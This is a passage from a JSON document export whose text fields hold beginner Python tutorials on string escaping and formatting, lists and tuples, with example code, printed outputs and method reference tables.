\\\"Geek\\\"\"print(\"\\nEscaping Double Quotes: \")print(String1)\u00a0# Printing Paths with the# use of Escape SequencesString1 = \"C:\\\\Python\\\\Geeks\\\\\"print(\"\\nEscaping Backslashes: \")print(String1)Output:\u00a0Initial String with use of Triple Quotes: \nI'm a \"Geek\"\n\nEscaping Single Quote: \nI'm a \"Geek\"\n\nEscaping Double Quotes: \nI'm a \"Geek\"\n\nEscaping Backslashes: \nC:\\Python\\Geeks\\To ignore the escape sequences in a String, r or R is used, this implies that the string is a raw string and escape sequences inside it are to be ignored.Python3# Printing Geeks in HEXString1 = \"This is \\x47\\x65\\x65\\x6b\\x73 in \\x48\\x45\\x58\"print(\"\\nPrinting in HEX with the use of Escape Sequences: \")print(String1)\u00a0# Using raw String to# ignore Escape SequencesString1 = r\"This is \\x47\\x65\\x65\\x6b\\x73 in \\x48\\x45\\x58\"print(\"\\nPrinting Raw String in HEX Format: \")print(String1)Output:\u00a0\u00a0Printing in HEX with the use of Escape Sequences: \nThis is Geeks in HEX\n\nPrinting Raw String in HEX Format: \nThis is \\x47\\x65\\x65\\x6b\\x73 in \\x48\\x45\\x58Formatting of StringsStrings in Python can be formatted with the use of format() method which is a very versatile and powerful tool for formatting Strings. Format method in String contains curly braces {} as placeholders which can hold arguments according to position or keyword to specify the order.Python3# Python Program for# Formatting of Strings\u00a0# Default orderString1 = \"{} {} {}\".format('Geeks', 'For', 'Life')print(\"Print String in default order: \")print(String1)\u00a0# Positional FormattingString1 = \"{1} {0} {2}\".format('Geeks', 'For', 'Life')print(\"\\nPrint String in Positional order: \")print(String1)\u00a0# Keyword FormattingString1 = \"{l} {f} {g}\".format(g='Geeks', f='For', l='Life')print(\"\\nPrint String in order of Keywords: \")print(String1)Output:\u00a0Print String in default order: \nGeeks For Life\n\nPrint String in Positional order: \nFor Geeks Life\n\nPrint String in order of Keywords: \nLife For GeeksIntegers such as Binary, hexadecimal, etc., and floats can be rounded or displayed in the exponent form with the use of format specifiers.\u00a0Python3# Formatting of IntegersString1 = \"{0:b}\".format(16)print(\"\\nBinary representation of 16 is \")print(String1)\u00a0# Formatting of FloatsString1 = \"{0:e}\".format(165.6458)print(\"\\nExponent representation of 165.6458 is \")print(String1)\u00a0# Rounding off IntegersString1 = \"{0:.2f}\".format(1/6)print(\"\\none-sixth is : \")print(String1)Output:\u00a0Binary representation of 16 is \n10000\n\nExponent representation of 165.6458 is \n1.656458e+02\n\none-sixth is : \n0.17A string can be left() or center(^) justified with the use of format specifiers, separated by a colon(:).\u00a0\u00a0Python3# String alignmentString1 = \"|{:<10}|{:^10}|{:>10}|\".format('Geeks', 'for', 'Geeks')print(\"\\nLeft, center and right alignment with Formatting: \")print(String1)\u00a0# To demonstrate aligning of spacesString1 = \"\\n{0:^16} was founded in {1:<4}!\".format(\"GeeksforGeeks\", 2009)print(String1)Output:\u00a0Left, center and right alignment with Formatting: \n|Geeks     |   for    |     Geeks|\n\n GeeksforGeeks   was founded in 2009 !Old style formatting was done without the use of format method by using % operator\u00a0Python3# Python Program for# Old Style Formatting# of Integers\u00a0Integer1 = 12.3456789print(\"Formatting in 3.2f format: \")print('The value of Integer1 is %3.2f' % Integer1)print(\"\\nFormatting in 3.4f format: \")print('The value of Integer1 is %3.4f' % Integer1)Output:\u00a0Formatting in 3.2f format: \nThe value of Integer1 is 12.35\n\nFormatting in 3.4f format: \nThe value of Integer1 is 12.3457Useful String Operations\u00a0\u00a0Logical Operators on StringString Formatting using %String Template ClassSplit a stringPython DocstringsString slicingFind all duplicate characters in stringReverse string in Python (5 different ways)Python program to check if a string is palindrome or notString constants\u00a0Built-In FunctionDescriptionstring.ascii_lettersConcatenation of the ascii_lowercase and ascii_uppercase constants.string.ascii_lowercaseConcatenation of lowercase lettersstring.ascii_uppercaseConcatenation of uppercase lettersstring.digitsDigit in stringsstring.hexdigitsHexadigit in stringsstring.lettersconcatenation of the strings lowercase and uppercasestring.lowercaseA string must contain lowercase letters.string.octdigitsOctadigit in a stringstring.punctuationASCII characters having punctuation characters.string.printableString of characters which are printableString.endswith()Returns True if a string ends with the given suffix otherwise returns FalseString.startswith()Returns True if a string starts with the given prefix otherwise returns FalseString.isdigit()Returns \u201cTrue\u201d if all characters in the string are digits, Otherwise, It returns \u201cFalse\u201d.String.isalpha()Returns \u201cTrue\u201d if all characters in the string are alphabets, Otherwise, It returns \u201cFalse\u201d.string.isdecimal()Returns true if all characters in a string are decimal.str.format()one of the string formatting methods in Python3, which allows multiple substitutions and value formatting.String.indexReturns the position of the first occurrence of substring in a stringstring.uppercaseA string must contain uppercase letters.string.whitespaceA string containing all characters that are considered whitespace.string.swapcase()Method converts all uppercase characters to lowercase and vice versa of the given string, and returns itreplace()returns a copy of the string where all occurrences of a substring is replaced with another substring.Deprecated string functionsBuilt-In FunctionDescriptionstring.IsdecimalReturns true if all characters in a string are decimalString.IsalnumReturns true if all the characters in a given string are alphanumeric.string.IstitleReturns True if the string is a title cased stringString.partitionsplits the string at the first occurrence of the separator and returns a tuple.String.IsidentifierCheck whether a string is a valid identifier or not.String.lenReturns the length of the string.String.rindexReturns the highest index of the substring inside the string if substring is found.String.MaxReturns the highest alphabetical character in a string.String.minReturns the minimum alphabetical character in a string.String.splitlinesReturns a list of lines in the string.string.capitalizeReturn a word with its first character capitalized.string.expandtabsExpand tabs in a string replacing them by one or more spacesstring.findReturn the lowest indexing a sub string.string.rfindfind the highest index.string.countReturn the number of (non-overlapping) occurrences of substring sub in stringstring.lowerReturn a copy of s, but with upper case, letters converted to lower case.string.splitReturn a list of the words of the string, If the optional second argument sep is absent or Nonestring.rsplit()Return a list of the words of the string s, scanning s from the end.rpartition()Method splits the given string into three partsstring.splitfieldsReturn a list of the words of the string when only used with two arguments.string.joinConcatenate a list or tuple of words with intervening occurrences of sep.string.strip()It returns a copy of the string with both leading and trailing white spaces removedstring.lstripReturn a copy of the string with leading white spaces removed.string.rstripReturn a copy of the string with trailing white spaces removed.string.swapcaseConverts lower case letters to upper case and vice versa.string.translateTranslate the characters using tablestring.upperlower case letters converted to upper case.string.ljustleft-justify in a field of given width.string.rjustRight-justify in a field of given width.string.center()Center-justify in a field of given width.string-zfillPad a numeric string on the left with zero digits until the given width is reached.string.replaceReturn a copy of string s with all occurrences of substring old replaced by new.string.casefold()Returns the string in lowercase which can be used for caseless comparisons.string.encodeEncodes the string into any encoding supported by Python. The default encoding is utf-8.string.maketransReturns a translation table usable for str.translate()Recent Articles on Python String\u00a0https://youtu.be/mvDQuegHVXgMore Videos on Python Strings:Python String Methods \u2013 Part2\u00a0Python String Methods \u2013 Part 3\u00a0Logical Operations and Splitting in Strings\u00a0Programs of Python Strings\u00a0\u00a0Strings \u2013 Set 1, Set 2String Methods \u2013 Set 1 , Set 2 , Set 3Regular Expressions (Search, Match and Find All)Python String Title methodSwap commas and dots in a StringProgram to convert String to a ListCount and display vowels in a stringPython program to check the validity of a PasswordPython program to count number of vowels using sets in given stringCheck for URL in a StringCheck if a Substring is Present in a Given StringCheck if two strings are anagram or notMap function and Dictionary in Python to sum ASCII valuesMap function and Lambda expression in Python to replace charactersSequenceMatcher in Python for Longest Common SubstringPrint the initials of a name with last name in fullThe k most frequent words from data set in PythonFind all close matches of input string from a listCheck if there are K consecutive 1\u2019s in a binary numberLambda and filter in PythonConcatenated string with uncommon characters in PythonCheck if both halves of the string have same set of characters in PythonFind the first repeated word in a string in PythonSecond most repeated word in a sequence in PythonK\u2019th Non-repeating Character in Python\u00a0Reverse words in a given String in PythonPrint number with commas as 1000 separators in PythonPrefix matching in Python using pytrie modulePython Regex to extract maximum numeric value from a stringPairs of complete strings in two setsRemove all duplicates words from a given sentenceSort words of sentence in ascending orderReverse each word in a sentencePython code to print common characters of two Strings in alphabetical orderPython program to split and join a stringPython code to move spaces to front of string in single traversalRun Length Encoding in PythonRemove all duplicates from a given string in PythonWays to increment a character in PythonPrefix matching in Python using pytrie modulePrint number with commas as 1000 separators in PythonReverse words in a given String in PythonExecute a String of Code in PythonString slicing in Python to check if a string can become empty by recursive deletionWays to print escape characters in PythonString slicing in Python to rotate a stringCount occurrences of a word in stringFind the k most frequent words from data set in PythonPython | Print the initials of a name with last name in fullZip function in Python to change to a new character setPython String isnumeric() and its applicationSort the words in lexicographical order in PythonFind the Number Occurring Odd Number of Times using Lambda expression and reduce functionPython String Title methodSort words of sentence in ascending orderConvert a list of characters into a stringPython groupby method to remove all consecutive duplicatesPython groupby method to remove all consecutive duplicatesPython program for removing i-th character from a stringReplacing strings with numbers in Python for Data AnalysisFormatted string literals (f-strings) in PythonPython DocstringsPermutation of a given string using inbuilt functionFind frequency of each word in a string in PythonProgram to accept the strings which contains all vowelsCount the Number of matching characters in a pair of stringCount all prefixes in given string with greatest frequencyProgram to check if a string contains any special characterGenerating random strings until a given string is generatedPython program to count upper and lower case characters without using inbuilt functionsMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "803812a067783d6cfceb991773cac681",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Lists are just like dynamically sized arrays, declared in other languages (vector in C++ and ArrayList in Java). Lists need not be homogeneous always which makes it the most powerful tool in Python. A single list may contain DataTypes like Integers, Strings, as well as Objects. Lists are mutable, and hence, they can be altered even after their creation.List in Python are ordered and have a definite count. The elements in a list are indexed according to a definite sequence and the indexing of a list is done with 0 being the first index. Each element in the list has its definite place in the list, which allows duplicating of elements in the list, with each element having its own distinct place and credibility.Note- Lists are a useful tool for preserving a sequence of data and further iterating over it.Table of content:\u00a0Creating a ListKnowing the size of ListAdding Elements to a List:\u00a0Using append() methodUsing insert() methodUsing extend() methodAccessing elements from the ListRemoving Elements from the List:\u00a0Using remove() methodUsing pop() methodSlicing of a ListList ComprehensionOperations on ListList MethodsCreating a ListLists in Python can be created by just placing the sequence inside the square brackets[]. Unlike Sets, a list doesn\u2019t need a built-in function for the creation of a list.\u00a0Note \u2013 Unlike Sets, the list may contain mutable elements.\u00a0\u00a0Python3# Python program to demonstrate# Creation of List\u00a0# Creating a ListList = []print(\"Blank List: \")print(List)\u00a0# Creating a List of numbersList = [10, 20, 14]print(\"\\nList of numbers: \")print(List)\u00a0# Creating a List of strings and accessing# using indexList = [\"Geeks\", \"For\", \"Geeks\"]print(\"\\nList Items: \")print(List[0])print(List[2])\u00a0# Creating a Multi-Dimensional List# (By Nesting a list inside a List)List = [['Geeks', 'For'], ['Geeks']]print(\"\\nMulti-Dimensional List: \")print(List)Output:\u00a0Blank List: \n[]\n\nList of numbers: \n[10, 20, 14]\n\nList Items\nGeeks\nGeeks\n\nMulti-Dimensional List: \n[['Geeks', 'For'], ['Geeks']]\u00a0Creating a list with multiple distinct or duplicate elementsA list may contain duplicate values with their distinct positions and hence, multiple distinct or duplicate values can be passed as a sequence at the time of list creation.Python3# Creating a List with# the use of Numbers# (Having duplicate values)List = [1, 2, 4, 4, 3, 3, 3, 6, 5]print(\"\\nList with the use of Numbers: \")print(List)\u00a0# Creating a List with# mixed type of values# (Having numbers and strings)List = [1, 2, 'Geeks', 4, 'For', 6, 'Geeks']print(\"\\nList with the use of Mixed Values: \")print(List)Output:\u00a0List with the use of Numbers: \n[1, 2, 4, 4, 3, 3, 3, 6, 5]\n\nList with the use of Mixed Values: \n[1, 2, 'Geeks', 4, 'For', 6, 'Geeks']\u00a0Knowing the size of ListPython3# Creating a ListList1 = []print(len(List1))\u00a0# Creating a List of numbersList2 = [10, 20, 14]print(len(List2))Output:\u00a00\n3\u00a0Adding Elements to a ListUsing append() methodElements can be added to the List by using the built-in append() function. Only one element at a time can be added to the list by using the append() method, for the addition of multiple elements with the append() method, loops are used. Tuples can also be added to the list with the use of the append method because tuples are immutable. Unlike Sets, Lists can also be added to the existing list with the use of the append() method.Python3# Python program to demonstrate# Addition of elements in a List\u00a0# Creating a ListList = []print(\"Initial blank List: \")print(List)\u00a0# Addition of Elements# in the ListList.append(1)List.append(2)List.append(4)print(\"\\nList after Addition of Three elements: \")print(List)\u00a0# Adding elements to the List# using Iteratorfor i in range(1, 4):\u00a0\u00a0\u00a0\u00a0List.append(i)print(\"\\nList after Addition of elements from 1-3: \")print(List)\u00a0# Adding Tuples to the ListList.append((5, 6))print(\"\\nList after Addition of a Tuple: \")print(List)\u00a0# Addition of List to a ListList2 = ['For', 'Geeks']List.append(List2)print(\"\\nList after Addition of a List: \")print(List)Output:\u00a0Initial blank List: \n[]\n\nList after Addition of Three elements: \n[1, 2, 4]\n\nList after Addition of elements from 1-3: \n[1, 2, 4, 1, 2, 3]\n\nList after Addition of a Tuple: \n[1, 2, 4, 1, 2, 3, (5, 6)]\n\nList after Addition of a List: \n[1, 2, 4, 1, 2, 3, (5, 6), ['For', 'Geeks']]\u00a0Using insert() methodappend() method only works for the addition of elements at the end of the List, for the addition of elements at the desired position, insert() method is used. Unlike append() which takes only one argument, the insert() method requires two arguments(position, value).\u00a0Python3# Python program to demonstrate# Addition of elements in a List\u00a0\u00a0# Creating a ListList = [1,2,3,4]print(\"Initial List: \")print(List)\u00a0# Addition of Element at# specific Position# (using Insert Method)List.insert(3, 12)List.insert(0, 'Geeks')print(\"\\nList after performing Insert Operation: \")print(List)Output:\u00a0Initial List: \n[1, 2, 3, 4]\n\nList after performing Insert Operation: \n['Geeks', 1, 2, 3, 12, 4]\u00a0Using extend() methodOther than append() and insert() methods, there\u2019s one more method for the Addition of elements, extend(), this method is used to add multiple elements at the same time at the end of the list.Note \u2013 append() and extend() methods can only add elements at the end.Python3# Python program to demonstrate# Addition of elements in a List\u00a0# Creating a ListList = [1, 2, 3, 4]print(\"Initial List: \")print(List)\u00a0# Addition of multiple elements# to the List at the end# (using Extend Method)List.extend([8, 'Geeks', 'Always'])print(\"\\nList after performing Extend Operation: \")print(List)Output:\u00a0Initial List: \n[1, 2, 3, 4]\n\nList after performing Extend Operation: \n[1, 2, 3, 4, 8, 'Geeks', 'Always']\u00a0Accessing elements from the ListIn order to access the list items refer to the index number. Use the index operator [ ] to access an item in a list. The index must be an integer. Nested lists are accessed using nested indexing.\u00a0Python3# Python program to demonstrate# accessing of element from list\u00a0# Creating a List with# the use of multiple valuesList = [\"Geeks\", \"For\", \"Geeks\"]\u00a0# accessing a element from the# list using index numberprint(\"Accessing a element from the list\")print(List[0])print(List[2])\u00a0# Creating a Multi-Dimensional List# (By Nesting a list inside a List)List = [['Geeks', 'For'], ['Geeks']]\u00a0# accessing an element from the# Multi-Dimensional List using# index numberprint(\"Accessing a element from a Multi-Dimensional list\")print(List[0][1])print(List[1][0])Output:\u00a0Accessing a element from the list\nGeeks\nGeeks\nAccessing a element from a Multi-Dimensional list\nFor\nGeeks\u00a0Negative indexingIn Python, negative sequence indexes represent positions from the end of the array. Instead of having to compute the offset as in List[len(List)-3], it is enough to just write List[-3]. Negative indexing means beginning from the end, -1 refers to the last item, -2 refers to the second-last item, etc.Python3List = [1, 2, 'Geeks', 4, 'For', 6, 'Geeks']\u00a0# accessing an element using# negative indexingprint(\"Accessing element using negative indexing\")\u00a0# print the last element of listprint(List[-1])\u00a0# print the third last element of listprint(List[-3])Output:\u00a0Accessing element using negative indexing\nGeeks\nFor\u00a0Removing Elements from the ListUsing remove() methodElements can be removed from the List by using the built-in remove() function but an Error arises if the element doesn\u2019t exist in the list. Remove() method only removes one element at a time, to remove a range of elements, the iterator is used. The remove() method removes the specified item.Note \u2013 Remove method in List will only remove the first occurrence of the searched element.Python3# Python program to demonstrate# Removal of elements in a List\u00a0# Creating a ListList = [1, 2, 3, 4, 5, 6,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a07, 8, 9, 10, 11, 12]print(\"Initial List: \")print(List)\u00a0# Removing elements from List# using Remove() methodList.remove(5)List.remove(6)print(\"\\nList after Removal of two elements: \")print(List)\u00a0# Removing elements from List# using iterator methodfor i in range(1, 5):\u00a0\u00a0\u00a0\u00a0List.remove(i)print(\"\\nList after Removing a range of elements: \")print(List)Output:\u00a0Initial List: \n[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]\n\nList after Removal of two elements: \n[1, 2, 3, 4, 7, 8, 9, 10, 11, 12]\n\nList after Removing a range of elements: \n[7, 8, 9, 10, 11, 12]\u00a0Using pop() methodPop() function can also be used to remove and return an element from the list, but by default it removes only the last element of the list, to remove an element from a specific position of the List, the index of the element is passed as an argument to the pop() method.Python3List = [1,2,3,4,5]\u00a0# Removing element from the# Set using the pop() methodList.pop()print(\"\\nList after popping an element: \")print(List)\u00a0# Removing element at a# specific location from the# Set using the pop() methodList.pop(2)print(\"\\nList after popping a specific element: \")print(List)Output:\u00a0List after popping an element: \n[1, 2, 3, 4]\n\nList after popping a specific element: \n[1, 2, 4]\u00a0Slicing of a ListIn Python List, there are multiple ways to print the whole List with all the elements, but to print a specific range of elements from the list, we use the Slice operation. Slice operation is performed on Lists with the use of a colon(:). To print elements from beginning to a range use [: Index], to print elements from end-use [:-Index], to print elements from specific Index till the end use [Index:], to print elements within a range, use [Start Index:End Index] and to print the whole List with the use of slicing operation, use [:]. Further, to print the whole List in reverse order, use [::-1].Note \u2013 To print elements of List from rear-end, use Negative Indexes.\u00a0Python3# Python program to demonstrate# Removal of elements in a List\u00a0# Creating a ListList = ['G', 'E', 'E', 'K', 'S', 'F',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'O', 'R', 'G', 'E', 'E', 'K', 'S']print(\"Initial List: \")print(List)\u00a0# Print elements of a range# using Slice operationSliced_List = List[3:8]print(\"\\nSlicing elements in a range 3-8: \")print(Sliced_List)\u00a0# Print elements from a# pre-defined point to endSliced_List = List[5:]print(\"\\nElements sliced from 5th \"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"element till the end: \")print(Sliced_List)\u00a0# Printing elements from# beginning till endSliced_List = List[:]print(\"\\nPrinting all elements using slice operation: \")print(Sliced_List)Output:\u00a0Initial List: \n['G', 'E', 'E', 'K', 'S', 'F', 'O', 'R', 'G', 'E', 'E', 'K', 'S']\n\nSlicing elements in a range 3-8: \n['K', 'S', 'F', 'O', 'R']\n\nElements sliced from 5th element till the end: \n['F', 'O', 'R', 'G', 'E', 'E', 'K', 'S']\n\nPrinting all elements using slice operation: \n['G', 'E', 'E', 'K', 'S', 'F', 'O', 'R', 'G', 'E', 'E', 'K', 'S']\u00a0Negative index List slicingPython3# Creating a ListList = ['G', 'E', 'E', 'K', 'S', 'F',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'O', 'R', 'G', 'E', 'E', 'K', 'S']print(\"Initial List: \")print(List)\u00a0# Print elements from beginning# to a pre-defined point using SliceSliced_List = List[:-6]print(\"\\nElements sliced till 6th element from last: \")print(Sliced_List)\u00a0# Print elements of a range# using negative index List slicingSliced_List = List[-6:-1]print(\"\\nElements sliced from index -6 to -1\")print(Sliced_List)\u00a0# Printing elements in reverse# using Slice operationSliced_List = List[::-1]print(\"\\nPrinting List in reverse: \")print(Sliced_List)Output:\u00a0Initial List: \n['G', 'E', 'E', 'K', 'S', 'F', 'O', 'R', 'G', 'E', 'E', 'K', 'S']\n\nElements sliced till 6th element from last: \n['G', 'E', 'E', 'K', 'S', 'F', 'O']\n\nElements sliced from index -6 to -1\n['R', 'G', 'E', 'E', 'K']\n\nPrinting List in reverse: \n['S', 'K', 'E', 'E', 'G', 'R', 'O', 'F', 'S', 'K', 'E', 'E', 'G']\u00a0List ComprehensionList comprehensions are used for creating new lists from other iterables like tuples, strings, arrays, lists, etc.A list comprehension consists of brackets containing the expression, which is executed for each element along with the for loop to iterate over each element.\u00a0Syntax:newList = [ expression(element) for element in oldList if condition ]Example:\u00a0Python3# Python program to demonstrate list# comprehension in Python\u00a0# below list contains square of all# odd numbers from range 1 to 10odd_square = [x ** 2 for x in range(1, 11) if x % 2 == 1]print(odd_square)Output:[1, 9, 25, 49, 81]For better understanding, the above code is similar to \u2013\u00a0Python3# for understanding, above generation is same as,odd_square = []\u00a0for x in range(1, 11):\u00a0\u00a0\u00a0\u00a0if x % 2 == 1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0odd_square.append(x**2)\u00a0print(odd_square)Output:[1, 9, 25, 49, 81]Refer to the below articles to get detailed information about List Comprehension.Python List Comprehension and SlicingNested List Comprehensions in PythonList comprehension and ord() in PythonOperations on ListFind length of listIterate over a list in PythonConcatenating two lists in PythonList Membership TestList MethodsFunctionDescriptionAppend()Add an element to the end of the listExtend()Add all elements of a list to another listInsert()Insert an item at the defined indexRemove()Removes an item from the listPop()Removes and returns an element at the given indexClear()Removes all items from the listIndex()Returns the index of the first matched itemCount()Returns the count of the number of items passed as an argumentSort()Sort items in a list in ascending orderReverse()Reverse the order of items in the listcopy()Returns a copy of the listBuilt-in functions with ListFunctionDescriptionreduce()apply a particular function passed in its argument to all of the list elements stores the intermediate result and only returns the final summation valuesum()Sums up the numbers in the listord()Returns an integer representing the Unicode code point of the given Unicode charactercmp()This function returns 1 if the first list is \u201cgreater\u201d than the second listmax()return maximum element of a given listmin()return minimum element of a given listall()Returns true if all element is true or if the list is emptyany()return true if any element of the list is true. if the list is empty, return falselen()Returns length of the list or size of the listenumerate()Returns enumerate object of the listaccumulate()apply a particular function passed in its argument to all of the list elements returns a list containing the intermediate resultsfilter()tests if each element of a list is true or notmap()returns a list of the results after applying the given function to each item of a given iterablelambda()This function can have any number of arguments but only one expression, which is evaluated and returned.Recent articles on ListsMore videos on Python Lists: Python List \u2013 Set 2More on Python List \u2013Creating a 3D ListIterate over a list in PythonIterate over multiple lists simultaneouslyInternal working of list in PythonPython SlicingPython List Comprehensions vs Generator ExpressionsList Methods in Python \u2013 Set 1 Set 2Lambda expression and filter functionUseful Links:\u00a0Recent Articles on Python ListPython TutorialsPython Output Programs in List: Set 6, Set 11, Set 12, Set 13Multiple Choice QuestionsAll articles in Python CategoryMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "fc66c885792d9c3a2f144ada5083cbbe",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Tuple is a collection of Python objects much like a list. The sequence of values stored in a tuple can be of any type, and they are indexed by integers.\u00a0Values of a tuple are syntactically separated by \u2018commas\u2019. Although it is not necessary, it is more common to define a tuple by closing the sequence of values in parentheses. This helps in understanding the Python tuples more easily.Creating a TupleIn Python, tuples are created by placing a sequence of values separated by \u2018comma\u2019 with or without the use of parentheses for grouping the data sequence.Note: Creation of Python tuple without the use of parentheses is known as Tuple Packing.\u00a0\u00a0Python program to demonstrate the addition of elements in a Tuple.Python3# Creating an empty TupleTuple1 = ()print(\"Initial empty Tuple: \")print(Tuple1)\u00a0# Creating a Tuple# with the use of stringTuple1 = ('Geeks', 'For')print(\"\\nTuple with the use of String: \")print(Tuple1)\u00a0# Creating a Tuple with# the use of listlist1 = [1, 2, 4, 5, 6]print(\"\\nTuple using List: \")print(tuple(list1))\u00a0# Creating a Tuple# with the use of built-in functionTuple1 = tuple('Geeks')print(\"\\nTuple with the use of function: \")print(Tuple1)Output:\u00a0Initial empty Tuple: \n()\n\nTuple with the use of String: \n('Geeks', 'For')\n\nTuple using List: \n(1, 2, 4, 5, 6)\n\nTuple with the use of function: \n('G', 'e', 'e', 'k', 's') Creating a Tuple with Mixed Datatypes.Tuples can contain any number of elements and of any datatype (like strings, integers, list, etc.). Tuples can also be created with a single element, but it is a bit tricky. Having one element in the parentheses is not sufficient, there must be a trailing \u2018comma\u2019 to make it a tuple.\u00a0Python3# Creating a Tuple# with Mixed DatatypeTuple1 = (5, 'Welcome', 7, 'Geeks')print(\"\\nTuple with Mixed Datatypes: \")print(Tuple1)\u00a0# Creating a Tuple# with nested tuplesTuple1 = (0, 1, 2, 3)Tuple2 = ('python', 'geek')Tuple3 = (Tuple1, Tuple2)print(\"\\nTuple with nested tuples: \")print(Tuple3)\u00a0# Creating a Tuple# with repetitionTuple1 = ('Geeks',) * 3print(\"\\nTuple with repetition: \")print(Tuple1)\u00a0# Creating a Tuple# with the use of loopTuple1 = ('Geeks')n = 5print(\"\\nTuple with a loop\")for i in range(int(n)):\u00a0\u00a0\u00a0\u00a0Tuple1 = (Tuple1,)\u00a0\u00a0\u00a0\u00a0print(Tuple1)Output:\u00a0Tuple with Mixed Datatypes: \n(5, 'Welcome', 7, 'Geeks')\n\nTuple with nested tuples: \n((0, 1, 2, 3), ('python', 'geek'))\n\nTuple with repetition: \n('Geeks', 'Geeks', 'Geeks')\n\nTuple with a loop\n('Geeks',)\n(('Geeks',),)\n((('Geeks',),),)\n(((('Geeks',),),),)\n((((('Geeks',),),),),)Accessing of TuplesTuples are immutable, and usually, they contain a sequence of heterogeneous elements that are accessed via unpacking or indexing (or even by attribute in the case of named tuples). Lists are mutable, and their elements are usually homogeneous and are accessed by iterating over the list.Note: In unpacking of tuple number of variables on the left-hand side should be equal to a number of values in given tuple a.\u00a0Python3# Accessing Tuple# with IndexingTuple1 = tuple(\"Geeks\")print(\"\\nFirst element of Tuple: \")print(Tuple1[0])\u00a0\u00a0# Tuple unpackingTuple1 = (\"Geeks\", \"For\", \"Geeks\")\u00a0# This line unpack# values of Tuple1a, b, c = Tuple1print(\"\\nValues after unpacking: \")print(a)print(b)print(c)Output:\u00a0First element of Tuple: \r\nG\r\n\r\nValues after unpacking: \r\nGeeks\r\nFor\r\nGeeksConcatenation of TuplesConcatenation of tuple is the process of joining two or more Tuples. Concatenation is done by the use of \u2018+\u2019 operator. Concatenation of tuples is done always from the end of the original tuple. Other arithmetic operations do not apply on Tuples.\u00a0Note- Only the same datatypes can be combined with concatenation, an error arises if a list and a tuple are combined.\u00a0Python3# Concatenation of tuplesTuple1 = (0, 1, 2, 3)Tuple2 = ('Geeks', 'For', 'Geeks')\u00a0Tuple3 = Tuple1 + Tuple2\u00a0# Printing first Tupleprint(\"Tuple 1: \")print(Tuple1)\u00a0# Printing Second Tupleprint(\"\\nTuple2: \")print(Tuple2)\u00a0# Printing Final Tupleprint(\"\\nTuples after Concatenation: \")print(Tuple3)Output:\u00a0Tuple 1: \n(0, 1, 2, 3)\n\nTuple2: \n('Geeks', 'For', 'Geeks')\n\nTuples after Concatenation: \n(0, 1, 2, 3, 'Geeks', 'For', 'Geeks')Slicing of TupleSlicing of a Tuple is done to fetch a specific range or slice of sub-elements from a Tuple. Slicing can also be done to lists and arrays. Indexing in a list results to fetching a single element whereas Slicing allows to fetch a set of elements.\u00a0Note- Negative Increment values can also be used to reverse the sequence of Tuples.\u00a0Python3# Slicing of a Tuple\u00a0# Slicing of a Tuple# with NumbersTuple1 = tuple('GEEKSFORGEEKS')\u00a0# Removing First elementprint(\"Removal of First Element: \")print(Tuple1[1:])\u00a0# Reversing the Tupleprint(\"\\nTuple after sequence of Element is reversed: \")print(Tuple1[::-1])\u00a0# Printing elements of a Rangeprint(\"\\nPrinting elements between Range 4-9: \")print(Tuple1[4:9])Output:\u00a0Removal of First Element: \n('E', 'E', 'K', 'S', 'F', 'O', 'R', 'G', 'E', 'E', 'K', 'S')\n\nTuple after sequence of Element is reversed: \n('S', 'K', 'E', 'E', 'G', 'R', 'O', 'F', 'S', 'K', 'E', 'E', 'G')\n\nPrinting elements between Range 4-9: \n('S', 'F', 'O', 'R', 'G')Deleting a TupleTuples are immutable and hence they do not allow deletion of a part of it. The entire tuple gets deleted by the use of del() method.\u00a0Note- Printing of Tuple after deletion results in an Error.\u00a0Python# Deleting a Tuple\u00a0Tuple1 = (0, 1, 2, 3, 4)del Tuple1\u00a0print(Tuple1)Traceback (most recent call last):\u00a0File \u201c/home/efa50fd0709dec08434191f32275928a.py\u201d, line 7, in\u00a0print(Tuple1)\u00a0NameError: name \u2018Tuple1\u2019 is not definedBuilt-In MethodsBuilt-in-MethodDescriptionindex( )Find in the tuple and returns the index of the given value where it\u2019s availablecount( )Returns the frequency of occurrence of a specified valueBuilt-In FunctionsBuilt-in FunctionDescriptionall()Returns true if all element are true or if tuple is emptyany()return true if any element of the tuple is true. if tuple is empty, return falselen()Returns length of the tuple or size of the tupleenumerate()Returns enumerate object of tuplemax()return maximum element of given tuplemin()return minimum element of given tuplesum()Sums up the numbers in the tuplesorted()input elements in the tuple and return a new sorted listtuple()Convert an iterable to a tuple.Recent Articles on TupleTuples ProgramsPrint unique rows in a given boolean StringsProgram to generate all possible valid IP addresses from given stringPython Dictionary to find mirror characters in a stringGenerate two output strings depending upon occurrence of character in input string in PythonPython groupby method to remove all consecutive duplicatesConvert a list of characters into a stringRemove empty tuples from a listReversing a TuplePython Set symmetric_difference()Convert a list of Tuples into DictionarySort a tuple by its float elementCount occurrences of an element in a TupleCount the elements in a list until an element is a TupleSort Tuples in Increasing Order by any keyNamedtuple in Python\u00a0Useful Links:Output of Python ProgramsRecent Articles on Python TuplesMultiple Choice Questions \u2013 PythonAll articles in Python CategoryMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "4cdf362110cb1d2a911acdd7f39300e3",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
